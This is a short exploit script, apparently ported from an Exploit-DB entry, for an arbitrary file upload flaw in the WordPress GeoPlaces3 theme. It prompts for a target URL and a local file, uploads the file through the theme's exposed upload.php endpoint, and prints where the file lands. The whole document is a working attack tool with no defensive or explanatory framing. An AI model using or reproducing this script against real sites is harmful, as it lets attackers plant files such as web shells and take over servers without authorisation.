/**
* Title: WordPress GeoPlaces3 Theme - Arbitrary File Upload Vulnerbility
* Discovered by: Mdn_Newbie
* Exploit from https://www.exploit-db.com/exploits/37956/
*/

load "http/curl"

print "WordPress GeoPlaces3 Theme Arbitrary File Uploads Vulnerbility\n"
print "URL Target: "
input.start()
    @url = input.value
input.close()


print "File upload: "
input.start()
    @filename = input.value
    @exploit = "/wp-content/themes/GeoPlaces3/library/includes/upload.php"
    curl.upload(@url.@exploit,@filename)
    print @url."/wp-content/uploads/tmp/"
input.close()